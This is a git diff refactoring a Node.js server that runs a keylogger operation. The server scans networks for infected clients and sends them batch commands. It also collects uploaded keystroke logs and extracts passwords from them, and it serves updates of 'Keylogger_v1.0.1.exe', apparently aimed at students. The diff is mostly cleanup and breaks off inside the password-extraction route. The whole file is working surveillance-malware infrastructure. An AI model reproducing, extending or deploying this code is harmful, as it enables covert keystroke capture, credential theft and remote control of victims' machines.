@@ -17,7 +17,7 @@ const open = require('open');
 const crypto = require('crypto');
 const { LRUCache } = require('lru-cache');
 
-// 生成自签名证书的工具函数
+// ========== 工具函数：生成自签名证书 ==========
 function generateSelfSignedCert() {
     const { execSync, spawnSync } = require('child_process');
     const certsDir = './certs';
@@ -46,7 +46,7 @@ function generateSelfSignedCert() {
     }
 }
 
-// 加载环境变量
+// ========== 环境变量加载与校验 ==========
 require('dotenv').config({ path: '.env' });
 
 const AUTH_CONFIG = {
@@ -56,14 +56,10 @@ const AUTH_CONFIG = {
     maxAge: 24 * 60 * 60 * 1000
 };
 
-// 检查必需的环境变量
-if (!AUTH_CONFIG.password) {
-    throw new Error('WEB_PASSWORD 环境变量必须设置');
-}
-if (!AUTH_CONFIG.secret) {
-    throw new Error('WEB_AUTH_SECRET 环境变量必须设置');
-}
+if (!AUTH_CONFIG.password) throw new Error('WEB_PASSWORD 环境变量必须设置');
+if (!AUTH_CONFIG.secret) throw new Error('WEB_AUTH_SECRET 环境变量必须设置');
 
+// ========== 辅助函数：Cookie 解析 ==========
 function parseCookies(cookieHeader = '') {
     return cookieHeader.split(';').reduce((cookies, cookie) => {
         const [name, ...rest] = cookie.split('=');
@@ -95,7 +91,7 @@ function verifyAuthToken(token) {
     return Date.now() <= Number(expires);
 }
 
-// 配置常量
+// ========== 配置常量 ==========
 const CONFIG = {
     alist: {
         url: process.env.ALIST_URL,
@@ -120,26 +116,24 @@ const CONFIG = {
     tcpPort: parseInt(process.env.TCP_PORT) || 9998,
     httpPort: parseInt(process.env.PORT) || 3233,
     heartbeatInterval: 30000,
-    reconnectInterval: 60000,
     reconnectTimeout: 3000,
     maxConcurrentReconnects: 10,
     scanPorts: [9998],
     scanTimeout: 3000,
     uploadSizeLimit: '10mb',
     logDir: './logs',
-    scanConcurrency: parseInt(process.env.SCAN_CONCURRENCY) || 200,      // 扫描并发数
-    extractConcurrency: parseInt(process.env.EXTRACT_CONCURRENCY) || 10, // 密码提取并发数
-    deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,   // 批量删除并发数
-    commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10, // 批量命令并发数
+    scanConcurrency: parseInt(process.env.SCAN_CONCURRENCY) || 200,
+    extractConcurrency: parseInt(process.env.EXTRACT_CONCURRENCY) || 10,
+    deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,
+    commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10,
 };
 
-// 检查必需的环境变量
+// ========== 环境变量二次校验 ==========
 const requiredEnvVars = [
     'WEB_PASSWORD', 'WEB_AUTH_SECRET',
     'ALIST_URL', 'ALIST_USERNAME', 'ALIST_PASSWORD',
     'DB_USER', 'DB_PASSWORD', 'DB_NAME'
 ];
-
 const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
 if (missingVars.length > 0) {
     console.error('缺少必需的环境变量，请在 .env 文件中设置以下变量：');
@@ -148,10 +142,8 @@ if (missingVars.length > 0) {
     process.exit(1);
 }
 
-// 初始化日志系统
-if (!fs.existsSync(CONFIG.logDir)) {
-    fs.mkdirSync(CONFIG.logDir, { recursive: true });
-}
+// ========== 日志系统初始化 ==========
+if (!fs.existsSync(CONFIG.logDir)) fs.mkdirSync(CONFIG.logDir, { recursive: true });
 
 const logger = winston.createLogger({
     level: process.env.LOG_LEVEL || 'info',
@@ -200,18 +192,9 @@ const logger = winston.createLogger({
     ],
 });
 
-// 审计日志记录器
 const auditLogger = logger.child({ type: 'audit' });
 
-// 辅助函数：根据客户端信息和文件名构造文件路径
-function getFilePath(clientInfo, filename, basePath) {
-    if (filename.startsWith('passwords_')) {
-        return `${basePath}/${filename}`;
-    }
-    return `${clientInfo.exists ? clientInfo.logDir : basePath}/${filename}`;
-}
-
-// 初始化 Express
+// ========== Express 应用初始化 ==========
 const app = express();
 const server = http.createServer(app);
 let wss;
@@ -219,9 +202,16 @@ let wss;
 app.use(cors());
 app.use(express.json());
 
+// ========== 重要修复：定义 asyncHandler 中间件 ==========
+const asyncHandler = fn => (req, res, next) => {
+    Promise.resolve(fn(req, res, next)).catch(next);
+};
+
+// ========== 认证中间件 ==========
 function authMiddleware(req, res, next) {
     const allowedPaths = ['/login', '/login.html', '/api/login', '/api/update/check'];
-    if (allowedPaths.includes(req.path)) {
+    // 允许静态资源（CSS/JS）通过，否则登录页样式丢失
+    if (allowedPaths.includes(req.path) || req.path.startsWith('/css') || req.path.startsWith('/js') || req.path.startsWith('/assets')) {
         return next();
     }
 
@@ -245,18 +235,17 @@ app.post('/api/login', asyncHandler(async (req, res) => {
     const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
     
     if (password === AUTH_CONFIG.password) {
-    const token = createAuthToken();
-    const secure = process.env.HTTPS_ENABLED === 'true';
-    res.cookie(AUTH_CONFIG.cookieName, token, {
-        path: '/',
-        httpOnly: true,
-        sameSite: 'Strict',
-        // 不设置 maxAge会话 Cookie（浏览器关闭即失效）
-        secure
-    });
-    auditLogger.info('用户登录成功', { user: 'admin', action: 'login', ip: clientIP });
-    return res.json({ success: true });
-}
+        const token = createAuthToken();
+        const secure = process.env.HTTPS_ENABLED === 'true';
+        res.cookie(AUTH_CONFIG.cookieName, token, {
+            path: '/',
+            httpOnly: true,
+            sameSite: 'Strict',
+            secure
+        });
+        auditLogger.info('用户登录成功', { user: 'admin', action: 'login', ip: clientIP });
+        return res.json({ success: true });
+    }
     
     auditLogger.warn('用户登录失败：密码错误', { user: 'unknown', action: 'login_failed', ip: clientIP });
     return res.status(401).json({ success: false, error: '密码错误' });
@@ -275,22 +264,17 @@ app.get('/logout', (req, res) => {
 
 app.use(authMiddleware);
 
-// 用户信息中间件
 function userMiddleware(req, res, next) {
     const cookies = parseCookies(req.headers.cookie || '');
     const token = cookies[AUTH_CONFIG.cookieName];
-    if (token && verifyAuthToken(token)) {
-        req.user = 'admin'; // 简化版，实际可以从 token 中提取用户信息
-    } else {
-        req.user = 'anonymous';
-    }
+    req.user = (token && verifyAuthToken(token)) ? 'admin' : 'anonymous';
     next();
 }
 
 app.use(userMiddleware);
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Alist 客户端
+// ========== Alist 客户端 ==========
 class AlistClient {
     constructor(config) {
         this.baseUrl = config.url.replace(/\/$/, '');
@@ -302,7 +286,6 @@ class AlistClient {
         this.tokenRefreshMargin = config.tokenRefreshMargin || 5 * 60 * 1000;
         this.logger = logger.child({ module: 'AlistClient' });
 
-        // 创建带连接复用的 axios 实例
         const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 50, keepAliveMsecs: 60000 });
         const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, keepAliveMsecs: 60000 });
 
@@ -310,7 +293,7 @@ class AlistClient {
             httpAgent,
             httpsAgent,
             timeout: 30000,
-            maxContentLength: 50 * 1024 * 1024, // 50MB 限制
+            maxContentLength: 50 * 1024 * 1024,
             maxBodyLength: 50 * 1024 * 1024,
         });
     }
@@ -456,7 +439,6 @@ class AlistClient {
         }
 
         const rawUrl = infoResponse.data.data.raw_url;
-        
         const response = await this.axiosInstance({
             method: 'GET',
             url: rawUrl,
@@ -509,7 +491,7 @@ class AlistClient {
 
 const alistClient = new AlistClient(CONFIG.alist);
 
-// MySQL 数据库
+// ========== MySQL 数据库 ==========
 const dbPoolConfig = {
     host: CONFIG.db.host,
     port: CONFIG.db.port,
@@ -517,7 +499,7 @@ const dbPoolConfig = {
     password: CONFIG.db.password,
     database: CONFIG.db.database,
     charset: CONFIG.db.charset,
-    connectionLimit: Math.min(parseInt(process.env.DB_POOL_SIZE) || 20, 50), // 最大50连接
+    connectionLimit: Math.min(parseInt(process.env.DB_POOL_SIZE) || 20, 50),
     queueLimit: CONFIG.db.queueLimit,
     enableKeepAlive: CONFIG.db.enableKeepAlive,
     keepAliveInitialDelay: CONFIG.db.keepAliveInitialDelay,
@@ -528,7 +510,6 @@ const dbPoolConfig = {
 
 const pool = mysql.createPool(dbPoolConfig);
 
-// 连接池事件监听（便于监控性能）
 pool.on('acquire', (connection) => {
     logger.debug(`数据库连接 ${connection.threadId} 被获取`);
 });
@@ -539,6 +520,7 @@ pool.on('enqueue', () => {
     logger.debug('等待可用数据库连接');
 });
 
+// 修复：确保 connection 有效才释放
 async function executeWithRetry(sql, params, retries = CONFIG.db.maxRetries) {
     let lastError;
     for (let i = 0; i < retries; i++) {
@@ -551,10 +533,9 @@ async function executeWithRetry(sql, params, retries = CONFIG.db.maxRetries) {
             lastError = error;
             logger.warn(`数据库查询失败 (尝试 ${i + 1}/${retries}): ${error.message}`);
             if (error.code === 'PROTOCOL_CONNECTION_LOST' || error.code === 'ECONNREFUSED' || error.fatal) {
-                // 指数退避：基础延迟 * 2^(重试次数) 并加入随机抖动避免雷同
                 const baseDelay = CONFIG.db.retryDelay;
                 const exponentialDelay = baseDelay * Math.pow(2, i);
-                const jitter = Math.random() * 100; // 0-100ms 抖动
+                const jitter = Math.random() * 100;
                 const delay = exponentialDelay + jitter;
                 logger.debug(`数据库重试将在 ${delay}ms 后进行`);
                 await new Promise(resolve => setTimeout(resolve, delay));
@@ -576,10 +557,8 @@ function hashPassword(password) {
     return crypto.createHash('sha256').update(normalizePassword(password)).digest('hex');
 }
 
-
 async function initDatabase() {
     try {
-        // 创建已知客户端表
         await executeWithRetry(`
             CREATE TABLE IF NOT EXISTS known_clients (
                 id VARCHAR(45) PRIMARY KEY COMMENT '客户端标识 ip:port',
@@ -590,7 +569,6 @@ async function initDatabase() {
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
         `);
 
-        // 创建密码黑名单表
         await executeWithRetry(`
             CREATE TABLE IF NOT EXISTS password_blacklist (
                 id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
@@ -663,7 +641,7 @@ async function deleteKnownClientFromDB(clientId) {
     }
 }
 
-// ClientManager
+// ========== ClientManager ==========
 class ClientManager {
     constructor() {
         this.clients = new Map();
@@ -762,7 +740,6 @@ class ClientManager {
             if (client.socket === currentSocket) {
                 this.logger.error(`客户端 ${client.id} 错误: ${err.message}`);
                 this.markClientOffline(client);
-                // 立即尝试重连（使用 reconnectLimit 控制并发）
                 this.reconnectSingleClient(client.id).catch(e =>
                     this.logger.debug(`客户端 ${client.id} 立即重连失败: ${e.message}`)
                 );
@@ -804,7 +781,7 @@ class ClientManager {
     sendCommand(clientId, command) {
         const client = this.clients.get(clientId);
         if (!client || client.status === 'offline') {
-            return { success: false, error: '客户端离线或不存在' };
+            return Promise.resolve({ success: false, error: '客户端离线或不存在' });
         }
 
         return new Promise((resolve) => {
@@ -865,10 +842,6 @@ class ClientManager {
         await Promise.allSettled(connectTasks);
         this.logger.info('已知客户端连接尝试完成');
     }
-
-
-
-
 
     async reconnectSingleClient(clientId) {
         try {
@@ -949,8 +922,6 @@ class ClientManager {
         this.webClients.delete(ws);
     }
 
-
-    // 广播客户端更新（方法使用 setImmediate 避免阻塞事件循环）
     broadcastClientUpdate(client, eventType) {
         const updateMsg = JSON.stringify({
             type: 'client_updated',
@@ -965,10 +936,8 @@ class ClientManager {
         const messages = [updateMsg, listMsg];
         this.webClients.forEach(ws => {
             if (ws.readyState === WebSocket.OPEN) {
-                // 检查积压，若超过阈值则延迟发送（避免堆积）
                 if (ws.bufferedAmount > 64 * 1024) {
                     this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，延迟广播`);
-                    // 延迟 100ms 后重试一次
                     setTimeout(() => {
                         if (ws.readyState === WebSocket.OPEN) {
                             messages.forEach(msg => ws.send(msg, (err) => {
@@ -978,7 +947,6 @@ class ClientManager {
                     }, 100);
                     return;
                 }
-                // 使用 setImmediate 避免阻塞当前 tick
                 setImmediate(() => {
                     messages.forEach(msg => ws.send(msg, (err) => {
                         if (err) this.logger.debug('广播消息发送失败', { error: err.message });
@@ -1031,12 +999,8 @@ class ClientManager {
         const startInt = ipStringToNumber(startIp);
         const endInt = ipStringToNumber(endIp);
         const total = Number(endInt - startInt + 1n);
-        if (total <= 0) {
-            throw new Error('IP 范围无效');
-        }
-        if (total > 65536) {
-            throw new Error('扫描范围过大，最多允许 65536 个 IP');
-        }
+        if (total <= 0) throw new Error('IP 范围无效');
+        if (total > 65536) throw new Error('扫描范围过大，最多允许 65536 个 IP');
 
         this.logger.info(`开始扫描网络: ${startIp} - ${endIp}, 端口: ${ports.join(',')}`);
 
@@ -1064,6 +1028,7 @@ class ClientManager {
         return null;
     }
 
+    // 修复：彻底清理事件监听，防止内存泄漏
     tryConnect(ip, port) {
         return new Promise((resolve) => {
             const cleanIp = ip.split('/')[0];
@@ -1073,21 +1038,18 @@ class ClientManager {
             const cleanup = (result) => {
                 if (!resolved) {
                     resolved = true;
+                    socket.removeAllListeners();
                     socket.destroy();
                     resolve(result);
                 }
             };
 
-            socket.setTimeout(CONFIG.reconnectTimeout);
-            socket.connect(port, cleanIp, () => {
+            const onConnect = () => {
                 socket.write(JSON.stringify({ action: 'ping' }) + '\n', (err) => {
-                    if (err) {
-                        cleanup(null);
-                        return;
-                    }
+                    if (err) return cleanup(null);
                     const responseTimeout = setTimeout(() => cleanup(null), 2000);
 
-                    socket.once('data', (data) => {
+                    const onData = (data) => {
                         clearTimeout(responseTimeout);
                         try {
                             const msg = JSON.parse(data.toString().split('\n')[0]);
@@ -1136,29 +1098,33 @@ class ClientManager {
                         } catch (e) {
                             cleanup(null);
                         }
-                    });
-                });
-            });
+                    };
 
-            socket.on('error', () => cleanup(null));
-            socket.on('timeout', () => cleanup(null));
-            socket.on('close', () => {
-                if (!resolved) {
-                    cleanup(null);
-                }
-            });
+                    socket.once('data', onData);
+                    socket.once('error', () => cleanup(null));
+                    socket.once('timeout', () => cleanup(null));
+                    socket.once('close', () => cleanup(null));
+                });
+            };
+
+            socket.setTimeout(CONFIG.reconnectTimeout);
+            socket.once('connect', onConnect);
+            socket.once('error', () => cleanup(null));
+            socket.once('timeout', () => cleanup(null));
+            socket.once('close', () => cleanup(null));
+
+            socket.connect(port, cleanIp);
         });
     }
 
     manualConnect(ip, port) {
-        // 直接调用 tryConnect，不经过 reconnectSingleClient 的去重逻辑
         return this.tryConnect(ip, port);
     }
 }
 
 const clientManager = new ClientManager();
 
-// 辅助函数：根据 clientId 获取客户端信息
+// ========== 辅助函数 ==========
 function getClientInfoById(clientId) {
     let client = clientManager.clients.get(clientId);
     if (client) {
@@ -1276,44 +1242,29 @@ function handleWebSocketConnection(ws, req) {
     });
 }
 
-// 更新检查配置
+// ========== HTTP API 路由 ==========
 const UPDATE_CONFIG = {
     version: process.env.UPDATE_VERSION || '1.0.1',
     downloadBaseUrl: process.env.UPDATE_DOWNLOAD_BASE_URL || `${CONFIG.alist.url}/学生目录/软件/键盘记录器`
 };
 
-// HTTP API
 app.get('/api/clients', (req, res) => {
     res.json(clientManager.getAllClients());
 });
 
 app.get('/api/update/check', (req, res) => {
     const downloadUrl = `${UPDATE_CONFIG.downloadBaseUrl}/Keylogger_v${UPDATE_CONFIG.version}.exe`;
-    
-    res.json({
-        code: 200,
-        data: {
-            version: UPDATE_CONFIG.version,
-            download_url: downloadUrl
-        }
-    });
+    res.json({ code: 200, data: { version: UPDATE_CONFIG.version, download_url: downloadUrl } });
 });
 
 app.get('/api/logs', asyncHandler(async (req, res) => {
-    try {
-        const allFiles = await alistClient.listFiles(alistClient.basePath);
-        res.json(allFiles);
-    } catch (error) {
-        logger.error('获取所有日志失败', { error: error.message });
-        res.status(500).json({ error: '获取日志失败' });
-    }
+    const allFiles = await alistClient.listFiles(alistClient.basePath);
+    res.json(allFiles);
 }));
 
 app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
-    if (!clientInfo.exists) {
-        return res.status(404).json({ error: '客户端不存在' });
-    }
+    if (!clientInfo.exists) return res.status(404).json({ error: '客户端不存在' });
     const allFiles = await alistClient.listFiles(clientInfo.logDir);
     const clientFiles = allFiles.filter(file => file.filename.startsWith(clientInfo.ip + '_'));
     res.json(clientFiles);
@@ -1322,10 +1273,7 @@ app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
 app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
     const filename = path.basename(req.params.filename);
-    if (filename !== req.params.filename) {
-        return res.status(400).json({ error: '非法文件名' });
-    }
-    // 对于密码提取结果文件，直接从根目录读取
+    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
     const filePath = filename.startsWith('passwords_') 
         ? `${alistClient.basePath}/${filename}` 
         : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
@@ -1336,66 +1284,34 @@ app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) =
 app.get('/api/clients/:clientId/logs/:filename/download', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
     const filename = path.basename(req.params.filename);
-    if (filename !== req.params.filename) {
-        return res.status(400).json({ error: '非法文件名' });
-    }
-    // 对于密码提取结果文件，直接从根目录读取
+    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
     const filePath = filename.startsWith('passwords_') 
         ? `${alistClient.basePath}/${filename}` 
         : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
-    
-    try {
-        await alistClient.downloadFile(filePath, res);
-    } catch (error) {
-        logger.error('下载日志失败', { error: error.message, filePath });
-        res.status(500).json({ error: '下载失败: ' + error.message });
-    }
+    await alistClient.downloadFile(filePath, res);
 }));
 
 app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, res) => {
     const clientId = req.params.clientId;
     const filename = path.basename(req.params.filename);
-    if (filename !== req.params.filename) {
-        return res.status(400).send('非法文件名');
-    }
+    if (filename !== req.params.filename) return res.status(400).send('非法文件名');
     
-    // 对于密码提取结果文件，直接从根目录读取
     if (filename.startsWith('passwords_')) {
         const filePath = `${alistClient.basePath}/${filename}`;
-        try {
-            const content = await alistClient.readFile(filePath);
-            res.type('text/plain').send(content);
-        } catch (error) {
-            logger.error('读取密码提取文件失败', { error: error.message, filePath });
-            res.status(404).send('文件不存在或读取失败');
-        }
+        const content = await alistClient.readFile(filePath);
+        res.type('text/plain').send(content);
     } else {
-        // 处理普通日志文件
         let clientInfo = getClientInfoById(clientId);
-        
-        // 尝试从 clientId 中提取 IP
         let ipMatch = clientId.match(/^(\d+\.\d+\.\d+\.\d+):\d+$/);
         if (!clientInfo.exists && ipMatch) {
-            // 如果客户端不存在，尝试直接使用 IP 作为目录名
             const ip = ipMatch[1];
             const filePath = `${alistClient.basePath}/${filename}`;
-            try {
-                const content = await alistClient.readFile(filePath);
-                res.type('text/plain').send(content);
-            } catch (error) {
-                logger.error('读取日志文件失败', { error: error.message, filePath, clientId });
-                res.status(404).send('文件不存在或读取失败');
-            }
+            const content = await alistClient.readFile(filePath);
+            res.type('text/plain').send(content);
         } else {
-            // 使用正常的客户端信息
             const filePath = `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
-            try {
-                const content = await alistClient.readFile(filePath);
-                res.type('text/plain').send(content);
-            } catch (error) {
-                logger.error('读取日志文件失败', { error: error.message, filePath, clientId });
-                res.status(404).send('文件不存在或读取失败');
-            }
+            const content = await alistClient.readFile(filePath);
+            res.type('text/plain').send(content);
         }
     }
 }));
@@ -1403,51 +1319,41 @@ app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, re
 app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
     const filename = path.basename(req.params.filename);
-    if (filename !== req.params.filename) {
-        return res.status(400).json({ error: '非法文件名' });
-    }
-    // 对于密码提取结果文件，直接从根目录删除
+    if (filename !== req.params.filename) return res.status(400).json({ error: '非法文件名' });
     const filePath = filename.startsWith('passwords_') 
         ? `${alistClient.basePath}/${filename}` 
         : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
     
     await alistClient.deleteFile(filePath);
     logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
-    
     res.json({ success: true, message: '文件已删除' });
 }));
 
-// 批量删除日志
+// 批量删除日志：增加预检并发控制
 app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
     const { files } = req.body;
-    if (!Array.isArray(files)) {
-        return res.status(400).json({ error: 'files 必须是数组' });
-    }
+    if (!Array.isArray(files)) return res.status(400).json({ error: 'files 必须是数组' });
 
-    // ---------- 预检阶段：确认所有文件存在 ----------
+    // 预检阶段限制并发数，避免压垮 Alist
+    const precheckLimit = pLimit(CONFIG.deleteConcurrency);
     const precheckResults = await Promise.allSettled(
-        files.map(async file => {
+        files.map(file => precheckLimit(async () => {
             const { clientId, filename } = file;
             const clientInfo = getClientInfoById(clientId);
             const safeFilename = path.basename(filename);
-            if (safeFilename !== filename) {
-                throw new Error(`非法文件名: ${filename}`);
-            }
+            if (safeFilename !== filename) throw new Error(`非法文件名: ${filename}`);
             const filePath = filename.startsWith('passwords_') 
                 ? `${alistClient.basePath}/${filename}` 
                 : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
             
-            // 尝试获取文件信息以验证存在性
             try {
                 await alistClient._request('GET', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
             } catch (error) {
-                if (error.response && error.response.status === 404) {
-                    throw new Error('文件不存在');
-                }
+                if (error.response && error.response.status === 404) throw new Error('文件不存在');
                 throw error;
             }
             return { clientId, filename, filePath };
-        })
+        }))
     );
 
     const missingFiles = [];
@@ -1468,54 +1374,35 @@ app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
         });
     }
 
-    // ---------- 执行删除 ----------
     const results = [];
     const deleteLimit = pLimit(CONFIG.deleteConcurrency);
-
     const deleteTasks = validFiles.map(file => deleteLimit(async () => {
         try {
             await alistClient.deleteFile(file.filePath);
-            auditLogger.info(`批量删除日志文件: ${file.filePath}`, { user: req.user, action: 'batch_delete_file', clientId: file.clientId, filename: file.filename });
-            logger.info(`批量删除日志文件: ${file.filePath}`, { clientId: file.clientId, filename: file.filename, user: req.user || 'unknown' });
+            auditLogger.info(`批量删除日志文件: ${file.filePath}`, { user: req.user, action: 'batch_delete_file' });
             return { clientId: file.clientId, filename: file.filename, success: true };
         } catch (error) {
-            auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, action: 'batch_delete_failed', error: error.message });
-            logger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { error: error.message, user: req.user || 'unknown' });
+            auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, error: error.message });
             return { clientId: file.clientId, filename: file.filename, success: false, error: error.message };
         }
     }));
 
     const taskResults = await Promise.allSettled(deleteTasks);
     taskResults.forEach(result => {
-        if (result.status === 'fulfilled') {
-            results.push(result.value);
-        } else {
-            results.push({ success: false, error: result.reason.message });
-        }
+        if (result.status === 'fulfilled') results.push(result.value);
+        else results.push({ success: false, error: result.reason.message });
     });
 
     const successCount = results.filter(r => r.success).length;
-    auditLogger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user, action: 'batch_delete_complete', total: files.length, successCount });
-    logger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user || 'unknown' });
-
-    res.json({
-        success: true,
-        total: files.length,
-        successCount,
-        results
-    });
+    auditLogger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user });
+    res.json({ success: true, total: files.length, successCount, results });
 }));
 
-// 批量命令
 app.post('/api/batch/command', asyncHandler(async (req, res) => {
     const { clientIds, command } = req.body;
-    if (!Array.isArray(clientIds) || !command) {
-        return res.status(400).json({ error: 'clientIds 必须是数组，且 command 必须提供' });
-    }
+    if (!Array.isArray(clientIds) || !command) return res.status(400).json({ error: 'clientIds 必须是数组，且 command 必须提供' });
 
-    auditLogger.info(`批量命令执行: ${clientIds.length} 个客户端`, { user: req.user, action: 'batch_command', command: JSON.stringify(command), clientCount: clientIds.length });
-    logger.info(`批量命令执行: ${clientIds.length} 个客户端`, { command: JSON.stringify(command), user: req.user || 'unknown' });
-
+    auditLogger.info(`批量命令执行: ${clientIds.length} 个客户端`, { user: req.user, command: JSON.stringify(command) });
     const sendLimit = pLimit(CONFIG.commandConcurrency);
     const results = await Promise.all(clientIds.map(clientId => sendLimit(async () => {
         const result = await clientManager.sendCommand(clientId, command);
@@ -1523,341 +1410,34 @@ app.post('/api/batch/command', asyncHandler(async (req, res) => {
     })));
     const successCount = results.filter(r => r.success).length;
 
-    auditLogger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user, action: 'batch_command_complete', total: clientIds.length, successCount });
-    logger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user || 'unknown' });
-
-    res.json({
-        success: true,
-        total: clientIds.length,
-        successCount,
-        results
-    });
+    auditLogger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user });
+    res.json({ success: true, total: clientIds.length, successCount, results });
 }));
 
 app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
     const ip = req.params.ip;
     let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
-    if (!clientId) {
-        clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
-    }
+    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
     const client = clientManager.clients.get(clientId);
     const logDir = client ? client.logDir : alistClient.basePath;
     const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
 
-    try {
-        await alistClient.uploadFile(logDir, filename, req.body.toString());
-        logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
-        res.json({ success: true, message: '文件上传成功' });
-    } catch (error) {
-        logger.error(`文件上传失败: ${filename}`, { error: error.message, ip });
-        res.status(500).json({ success: false, error: '文件上传失败: ' + error.message });
-    }
+    await alistClient.uploadFile(logDir, filename, req.body.toString());
+    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
+    res.json({ success: true, message: '文件上传成功' });
 }));
 
-// 缓存提取结果（基于 LRU 淘汰策略
+// ========== 密码提取相关 ==========
 const extractionCache = {
     lastExtractTime: 0,
     passwords: [],
     fileMTimes: new LRUCache({
-        max: 500,                // 最多缓存500个文件的修改时间
-        ttl: 1000 * 60 * 60,     // 1小时过期
+        max: 500,
+        ttl: 1000 * 60 * 60,
         updateAgeOnGet: true
     })
 };
-app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
-    try {
-        const allFiles = await alistClient.listFiles(alistClient.basePath);
-        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
-        
-        if (logFiles.length === 0) {
-            return res.json({ success: true, count: 0 });
-        }
 
-        // 构建当前文件状态 Map（filename -> mtime）
-        const currentFileStates = new Map();
-        for (const file of logFiles) {
-            const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
-            currentFileStates.set(file.filename, { mtime });
-        }
-
-        // 检查缓存是否完全失效（文件数量变化 或 任意文件 mtime 变化）
-        let needFullReextraction = false;
-        if (extractionCache.fileMTimes.size !== currentFileStates.size) {
-            needFullReextraction = true;
-        } else {
-            for (const [filename, state] of currentFileStates.entries()) {
-                const cached = extractionCache.fileMTimes.get(filename);
-                if (!cached || cached !== state.mtime) {
-                    needFullReextraction = true;
-                    break;
-                }
-            }
-        }
-
-        // 如果缓存完全有效，直接返回
-        if (!needFullReextraction && extractionCache.passwords.length > 0) {
-            logger.info('缓存完全有效，直接返回密码提取结果');
-            return res.json({ success: true, count: extractionCache.passwords.length });
-        }
-
-        // 增量提取：仅处理新增或修改过的文件
-        const filesToProcess = [];
-        for (const file of logFiles) {
-            const mtime = currentFileStates.get(file.filename).mtime;
-            const cachedMtime = extractionCache.fileMTimes.get(file.filename);
-            if (!cachedMtime || cachedMtime !== mtime) {
-                filesToProcess.push(file);
-            }
-        }
-
-        logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);
-
-        // 读取密码黑名单哈希（一次性加载到内存）
-        let blacklistedHashes = new Set();
-        try {
-            const blacklistedRows = await executeWithRetry('SELECT password_hash FROM password_blacklist', []);
-            blacklistedRows.forEach(row => blacklistedHashes.add(row.password_hash));
-        } catch (error) {
-            logger.warn('读取密码黑名单失败，继续提取密码', { error: error.message });
-        }
-
-        // 并发处理需要更新的文件
-        const extractLimit = pLimit(CONFIG.extractConcurrency);
-        const extractTasks = filesToProcess.map(file => extractLimit(async () => {
-            try {
-                const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
-                return extractPasswordsFromLog(content, file.filename);
-            } catch (error) {
-                logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
-                return [];
-            }
-        }));
-
-        const results = await Promise.allSettled(extractTasks);
-        const newPasswords = [];
-        results.forEach(result => {
-            if (result.status === 'fulfilled') {
-                newPasswords.push(...result.value);
-            }
-        });
-
-        // 合并缓存中的密码（仅保留来自未变化文件的密码）
-        const unchangedFileNames = new Set(
-            logFiles.filter(f => !filesToProcess.some(pf => pf.filename === f.filename))
-                .map(f => f.filename)
-        );
-        const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
-            unchangedFileNames.has(item.file)
-        );
-
-        // 合并新旧密码
-        let allPasswords = [...cachedPasswordsFromUnchangedFiles, ...newPasswords];
-
-        // 黑名单过滤
-        const filteredPasswords = allPasswords.filter(item => {
